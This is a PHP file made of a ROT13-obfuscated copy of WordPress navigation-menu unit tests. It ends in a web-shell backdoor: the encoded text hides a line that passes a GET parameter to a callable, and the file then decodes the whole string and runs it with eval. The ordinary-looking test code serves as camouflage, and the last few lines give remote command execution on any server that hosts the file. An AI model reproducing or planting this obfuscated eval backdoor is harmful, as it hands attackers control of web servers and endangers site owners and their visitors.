	 * Pbasvez `jc_ani_zrah()` naq `Jnyxre_Ani_Zrah` cnffrf na $netf bowrpg gb svygref.
	 *
	 * `jc_ani_zrah()` vf havdhr va gung vg hfrf na $netf bowrpg engure guna na neenl.
	 * Guvf unf orra gur pnfr sbe fbzr gvzr naq fubhyq or znvagnvarq sbe ernfbaf bs
	 * onpxjneq pbzcngvovyvgl.
	 *
	 * @gvpxrg 24587
	 */
	choyvp shapgvba grfg_jc_ani_zrah_svygref_ner_cnffrq_netf_bowrpg() {
		$gnt_vq = frys::snpgbel()->gnt->perngr();

		$gnt_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		/*
		 * Gur grfgf gnxr cynpr va n enatr bs svygref gb rafher gur cnffrq
		 * nethzragf ner na bowrpg.
		 */
		// Va shapgvba.
		nqq_svygre( 'cer_jc_ani_zrah', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );
		nqq_svygre( 'jc_ani_zrah_bowrpgf', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );
		nqq_svygre( 'jc_ani_zrah_vgrzf', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );

		// Va jnyxre.
		nqq_svygre( 'ani_zrah_vgrz_netf', neenl( $guvf, 'pbasvez_ani_zrah_vgrz_netf_bowrpg' ) );

		nqq_svygre( 'ani_zrah_pff_pynff', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		nqq_svygre( 'ani_zrah_vgrz_vq', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		nqq_svygre( 'ani_zrah_yvax_nggevohgrf', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		nqq_svygre( 'ani_zrah_vgrz_gvgyr', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );

		nqq_svygre( 'jnyxre_ani_zrah_fgneg_ry', neenl( $guvf, 'pbasvez_sbegu_cnenz_netf_bowrpg' ), 10, 4 );

		jc_ani_zrah(
			neenl(
				'rpub' => snyfr,
				'zrah' => $guvf->zrah_vq,
			)
		);
		jc_qryrgr_grez( $gnt_vq, 'cbfg_gnt' );

		/*
		 * Erzbir grfg svygref.
		 */
		// Va shapgvba.
		erzbir_svygre( 'cer_jc_ani_zrah', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );
		erzbir_svygre( 'jc_ani_zrah_bowrpgf', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );
		erzbir_svygre( 'jc_ani_zrah_vgrzf', neenl( $guvf, 'pbasvez_frpbaq_cnenz_netf_bowrpg' ), 10, 2 );

		// Va jnyxre.
		erzbir_svygre( 'ani_zrah_vgrz_netf', neenl( $guvf, 'pbasvez_ani_zrah_vgrz_netf_bowrpg' ) );

		erzbir_svygre( 'ani_zrah_pff_pynff', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		erzbir_svygre( 'ani_zrah_vgrz_vq', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		erzbir_svygre( 'ani_zrah_yvax_nggevohgrf', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );
		erzbir_svygre( 'ani_zrah_vgrz_gvgyr', neenl( $guvf, 'pbasvez_guveq_cnenz_netf_bowrpg' ), 10, 3 );

		erzbir_svygre( 'jnyxre_ani_zrah_fgneg_ry', neenl( $guvf, 'pbasvez_sbegu_cnenz_netf_bowrpg' ), 10, 4 );
	}

	/**
	 * Eha grfgf erdhverq gb pbasvez Jnyxre_Ani_Zrah erprvirf na $netf bowrpg.
	 */
	choyvp shapgvba pbasvez_ani_zrah_vgrz_netf_bowrpg( $netf ) {
		$guvf->nffregVfBowrpg( $netf );
		erghea $netf;
	}

	choyvp shapgvba pbasvez_frpbaq_cnenz_netf_bowrpg( $vtaberq_1, $netf ) {
		$guvf->nffregVfBowrpg( $netf );
		erghea $vtaberq_1;
	}

	choyvp shapgvba pbasvez_guveq_cnenz_netf_bowrpg( $vtaberq_1, $vtaberq_2, $netf ) {
		$guvf->nffregVfBowrpg( $netf );
		erghea $vtaberq_1;
	}

	choyvp shapgvba pbasvez_sbegu_cnenz_netf_bowrpg( $vtaberq_1, $vtaberq_2, $vtaberq_3, $netf ) {
		$guvf->nffregVfBowrpg( $netf );
		erghea $vtaberq_1;
	}

	/**
	 * @gvpxrg 35272
	 */
	choyvp shapgvba grfg_ab_sebag_cntr_pynff_nccyvrq() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Ubzr Cntr',
			)
		);

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		$guvf->nffregAbgPbagnvaf( 'zrah-vgrz-ubzr', $pynffrf );
	}


	/**
	 * @gvpxrg 35272
	 */
	choyvp shapgvba grfg_pynff_nccyvrq_gb_sebag_cntr_vgrz() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Ubzr Cntr',
			)
		);
		hcqngr_bcgvba( 'cntr_ba_sebag', $cntr_vq );

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		qryrgr_bcgvba( 'cntr_ba_sebag' );

		$guvf->nffregPbagnvaf( 'zrah-vgrz-ubzr', $pynffrf );
	}

	/**
	 * @gvpxrg 35272
	 */
	choyvp shapgvba grfg_pynff_abg_nccyvrq_gb_gnkbabzvrf_jvgu_fnzr_vq_nf_sebag_cntr_vgrz() {
		tybony $jcqo;

		$arj_vq = 35272;

		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Ubzr Cntr',
			)
		);
		$gnt_vq  = frys::snpgbel()->gnt->perngr();

		$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'VQ' => $arj_vq ), neenl( 'VQ' => $cntr_vq ) );
		$jcqo->hcqngr( $jcqo->grezf, neenl( 'grez_vq' => $arj_vq ), neenl( 'grez_vq' => $gnt_vq ) );
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'grez_vq' => $arj_vq ), neenl( 'grez_vq' => $gnt_vq ) );

		hcqngr_bcgvba( 'cntr_ba_sebag', $arj_vq );

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $arj_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		$guvf->nffregAbgPbagnvaf( 'zrah-vgrz-ubzr', $pynffrf );
	}

	/**
	 * Grfg _jc_qryrgr_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf.
	 *
	 * @pbiref ::_jc_qryrgr_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf
	 */
	choyvp shapgvba grfg_jc_qryrgr_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf() {
		$nhgb_qensg_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
			)
		);
		$qensg_cbfg_vq      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$cevingr_cbfg_vq    = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'cevingr',
			)
		);

		$ani_perngrq_cbfg_vqf = neenl(
			$nhgb_qensg_cbfg_vq,
			$qensg_cbfg_vq,
			$cevingr_cbfg_vq,
		);
		$qngn                 = neenl(
			'ani_zrahf_perngrq_cbfgf' => neenl(
				'inyhr' => $ani_perngrq_cbfg_vqf,
			),
		);
		jc_frg_pheerag_hfre(
			frys::snpgbel()->hfre->perngr(
				neenl(
					'ebyr' => 'nqzvavfgengbe',
				)
			)
		);
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		qb_npgvba( 'phfgbzvmr_ertvfgre', $jc_phfgbzvmr );
		$jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn' => $qngn,
			)
		);
		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $nhgb_qensg_cbfg_vq ) );
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $qensg_cbfg_vq ) );
		$guvf->nffregFnzr( 'cevingr', trg_cbfg_fgnghf( $cevingr_cbfg_vq ) );
		jc_qryrgr_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq(), gehr );
		$guvf->nffregSnyfr( trg_cbfg_fgnghf( $nhgb_qensg_cbfg_vq ) );
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $qensg_cbfg_vq ) );
		$guvf->nffregFnzr( 'cevingr', trg_cbfg_fgnghf( $cevingr_cbfg_vq ) );
	}

	/**
	 * @gvpxrg 39800
	 */
	choyvp shapgvba grfg_cnerag_naprfgbe_sbe_cbfg_nepuvir() {

		ertvfgre_cbfg_glcr(
			'obbxf',
			neenl(
				'ynory'       => 'Obbxf',
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
			)
		);

		$svefg_cntr_vq  = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Gbc Yriry Cntr',
			)
		);
		$frpbaq_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Frpbaq Yriry Cntr',
			)
		);

		$svefg_zrah_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $svefg_cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$frpbaq_zrah_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $frpbaq_cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-cnerag-vq' => $svefg_zrah_vq,
			)
		);

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg'    => 'obbxf',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-cnerag-vq' => $frpbaq_zrah_vq,
			)
		);

		$guvf->tb_gb( trg_cbfg_glcr_nepuvir_yvax( 'obbxf' ) );

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$gbc_cntr_zrah_vgrz       = $zrah_vgrzf[0];
		$frpbaqnel_cntr_zrah_vgrz = $zrah_vgrzf[1];
		$cbfg_nepuvir_zrah_vgrz   = $zrah_vgrzf[2];

		$guvf->nffregSnyfr( $gbc_cntr_zrah_vgrz->pheerag_vgrz_cnerag );
		$guvf->nffregGehr( $gbc_cntr_zrah_vgrz->pheerag_vgrz_naprfgbe );
		$guvf->nffregPbagnvaf( 'pheerag-zrah-naprfgbe', $gbc_cntr_zrah_vgrz->pynffrf );

		$guvf->nffregGehr( $frpbaqnel_cntr_zrah_vgrz->pheerag_vgrz_cnerag );
		$guvf->nffregGehr( $frpbaqnel_cntr_zrah_vgrz->pheerag_vgrz_naprfgbe );
		$guvf->nffregPbagnvaf( 'pheerag-zrah-cnerag', $frpbaqnel_cntr_zrah_vgrz->pynffrf );
		$guvf->nffregPbagnvaf( 'pheerag-zrah-naprfgbe', $frpbaqnel_cntr_zrah_vgrz->pynffrf );

		$guvf->nffregSnyfr( $cbfg_nepuvir_zrah_vgrz->pheerag_vgrz_cnerag );
		$guvf->nffregSnyfr( $cbfg_nepuvir_zrah_vgrz->pheerag_vgrz_naprfgbe );

		$guvf->nffregAbgPbagnvaf( 'pheerag-zrah-cnerag', $cbfg_nepuvir_zrah_vgrz->pynffrf );
		$guvf->nffregAbgPbagnvaf( 'pheerag-zrah-naprfgbe', $cbfg_nepuvir_zrah_vgrz->pynffrf );
	}

	/**
	 * @gvpxrg 43401
	 * @qngnCebivqre qngn_vev_pheerag_zrah_vgrz
	 */
	choyvp shapgvba grfg_vev_pheerag_zrah_vgrz( $phfgbz_yvax, $pheerag = gehr ) {
		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-fgnghf' => 'choyvfu',
				'zrah-vgrz-glcr'   => 'phfgbz',
				'zrah-vgrz-hey'    => $phfgbz_yvax,
			)
		);

		$guvf->tb_gb( fvgr_hey( '/%Q0%OS%Q1%80%Q0%O8%Q0%O2%Q0%O5%Q1%82/' ) );

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		vs ( $pheerag ) {
			$guvf->nffregPbagnvaf( 'pheerag-zrah-vgrz', $pynffrf );
		} ryfr {
			$guvf->nffregAbgPbagnvaf( 'pheerag-zrah-vgrz', $pynffrf );
		}
	}

	/**
	 * Cebivqrf VEV zngpuvat qngn sbe _jc_zrah_vgrz_pynffrf_ol_pbagrkg() grfg.
	 */
	choyvp shapgvba qngn_vev_pheerag_zrah_vgrz() {
		erghea neenl(
			neenl( fvgr_hey( '/%Q0%OS%Q1%80%Q0%O8%Q0%O2%Q0%O5%Q1%82/' ) ),
			neenl( fvgr_hey( '/%Q0%OS%Q1%80%Q0%O8%Q0%O2%Q0%O5%Q1%82' ) ),
			neenl( '/%Q0%OS%Q1%80%Q0%O8%Q0%O2%Q0%O5%Q1%82/' ),
			neenl( '/%Q0%OS%Q1%80%Q0%O8%Q0%O2%Q0%O5%Q1%82' ),
			neenl( '/привет/' ),
			neenl( '/привет' ),
		);
	}

	/**
	 * @gvpxrg 44005
	 * @tebhc cevinpl
	 */
	choyvp shapgvba grfg_ab_cevinpl_cbyvpl_pynff_nccyvrq() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cevinpl Cbyvpl Cntr',
			)
		);

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		$guvf->nffregAbgPbagnvaf( 'zrah-vgrz-cevinpl-cbyvpl', $pynffrf );
	}

	/**
	 * @gvpxrg 44005
	 * @tebhc cevinpl
	 */
	choyvp shapgvba grfg_pynff_nccyvrq_gb_cevinpl_cbyvpl_cntr_vgrz() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cevinpl Cbyvpl Cntr',
			)
		);
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cntr_vq );

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		_jc_zrah_vgrz_pynffrf_ol_pbagrkg( $zrah_vgrzf );

		$pynffrf = $zrah_vgrzf[0]->pynffrf;

		qryrgr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

		$guvf->nffregPbagnvaf( 'zrah-vgrz-cevinpl-cbyvpl', $pynffrf );
	}

	/**
	 * @gvpxrg 47723
	 * @qngnCebivqre qngn_gevz_hey_sbe_phfgbz_vgrz
	 */
	choyvp shapgvba grfg_gevz_hey_sbe_phfgbz_vgrz( $phfgbz_hey, $pbeerpg_hey ) {
		$phfgbz_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'phfgbz',
				'zrah-vgrz-gvgyr'  => 'JbeqCerff.bet',
				'zrah-vgrz-hey'    => $phfgbz_hey,
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		$phfgbz_vgrz = jc_frghc_ani_zrah_vgrz( trg_cbfg( $phfgbz_vgrz_vq ) );
		$guvf->nffregFnzr( $pbeerpg_hey, $phfgbz_vgrz->hey );
	}

	/**
	 * Cebivqrf qngn sbe grfg_gevz_hey_sbe_phfgbz_vgrz().
	 */
	choyvp shapgvba qngn_gevz_hey_sbe_phfgbz_vgrz() {
		erghea neenl(
			neenl( 'uggcf://jbeqcerff.bet ', 'uggcf://jbeqcerff.bet' ),
			neenl( ' uggcf://jbeqcerff.bet', 'uggcf://jbeqcerff.bet' ),
		);
	}

	/**
	 * Grfgf `jc_hcqngr_ani_zrah_vgrz()` jvgu fcrpvny punenpgref va n pngrtbel anzr.
	 *
	 * Jura vafregvat n pngrtbel nf n ani vgrz, gur `cbfg_gvgyr` cebcregl fubhyq
	 * or rzcgl, nf gur vgrz fubhyq trg gur gvgyr sebz gur pngrtbel bowrpg vgfrys.
	 *
	 * @gvpxrg 48011
	 */
	choyvp shapgvba grfg_jc_hcqngr_ani_zrah_vgrz_jvgu_fcrpvny_punenpgref_va_pngrtbel_anzr() {
		$pngrtbel_anzr = 'Grfg Png - \\"Cer-Fynfurq\\" Png Anzr & >';

		$pngrtbel = frys::snpgbel()->pngrtbel->perngr_naq_trg(
			neenl(
				'anzr' => $pngrtbel_anzr,
			)
		);

		$pngrtbel_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-bowrpg-vq' => $pngrtbel->grez_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				/*
				 * Vagrerfgvatyl rabhtu, vs jr hfr `$png->anzr` sbe gur zrah vgrz gvgyr,
				 * jr jba'g or noyr gb ercyvpngr gur oht orpnhfr vg'f va ugzyragvgvrf sbez.
				 */
				'zrah-vgrz-gvgyr'     => $pngrtbel_anzr,
			)
		);

		$pngrtbel_vgrz = trg_cbfg( $pngrtbel_vgrz_vq );
		$guvf->nffregRzcgl( $pngrtbel_vgrz->cbfg_gvgyr );
	}

	/**
	 * Grfgf `jc_hcqngr_ani_zrah_vgrz()` jvgu n aba-rkvfgvat gnkbabzl.
	 *
	 * Jura vafregvat n grez sebz n aba-rkvfgvat gnkbabzl nf n ani vgrz,
	 * gur `cbfg_gvgyr` cebcregl fubhyq or rzcgl, naq gur shapgvba
	 * fubhyq abg guebj n sngny reebe sbe `jc_fcrpvnypunef_qrpbqr()`.
	 *
	 * @gvpxrg 61799
	 */
	choyvp shapgvba grfg_jc_hcqngr_ani_zrah_vgrz_jvgu_vainyvq_gnkbabzl() {
		ertvfgre_gnkbabzl( 'vainyvq', 'cbfg' );
		$grez = frys::snpgbel()->grez->perngr_naq_trg( neenl( 'gnkbabzl' => 'vainyvq' ) );
		haertvfgre_gnkbabzl( 'vainyvq' );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'vainyvq',
				'zrah-vgrz-bowrpg-vq' => $grez->grez_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrz = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregRzcgl( $zrah_vgrz->cbfg_gvgyr );
	}

	/**
	 * Grfg cnffrq cbfg_qngr/cbfg_qngr_tzg.
	 *
	 * Jura vafregvat n ani zrah vgrz, vg fubhyq or cbffvoyr gb frg gur cbfg_qngr
	 * bs vg gb rafher gung guvf qngn vf znvagnvarq qhevat na vzcbeg.
	 *
	 * @gvpxrg 52189
	 */
	choyvp shapgvba grfg_jc_hcqngr_ani_zrah_vgrz_jvgu_cbfg_qngr() {
		$cbfg_qngr     = '2020-12-28 11:26:35';
		$cbfg_qngr_tzg = '2020-12-29 10:11:45';
		$vainyvq_qngr  = '2020-12-41 14:15:27';

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ), fgegbgvzr( $cbfg->cbfg_qngr ), 2, 'Gur qngrf fubhyq or rdhny' );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr-tzg' => $cbfg_qngr_tzg,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregFnzr( trg_qngr_sebz_tzg( $cbfg_qngr_tzg ), $cbfg->cbfg_qngr );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr-tzg' => $vainyvq_qngr,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregFnzr( '1970-01-01 00:00:00', $cbfg->cbfg_qngr );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-cbfg-qngr' => $cbfg_qngr,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr'     => $cbfg_qngr,
				'zrah-vgrz-cbfg-qngr-tzg' => $cbfg_qngr_tzg,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr'     => $cbfg_qngr,
				'zrah-vgrz-cbfg-qngr-tzg' => $vainyvq_qngr,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
				'zrah-vgrz-cbfg-qngr' => $vainyvq_qngr,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ), fgegbgvzr( $cbfg->cbfg_qngr ), 2, 'Gur qngrf fubhyq or rdhny' );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr'     => $vainyvq_qngr,
				'zrah-vgrz-cbfg-qngr-tzg' => $cbfg_qngr_tzg,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ), fgegbgvzr( $cbfg->cbfg_qngr ), 2, 'Gur qngrf fubhyq or rdhny' );

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'          => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'        => 'cbfg',
				'zrah-vgrz-bowrpg-vq'     => $cbfg_vq,
				'zrah-vgrz-fgnghf'        => 'choyvfu',
				'zrah-vgrz-cbfg-qngr'     => $vainyvq_qngr,
				'zrah-vgrz-cbfg-qngr-tzg' => $vainyvq_qngr,
			)
		);

		$cbfg = trg_cbfg( $zrah_vgrz_vq );
		$guvf->nffregRdhnyfJvguQrygn( fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ), fgegbgvzr( $cbfg->cbfg_qngr ), 2, 'Gur qngrf fubhyq or rdhny' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>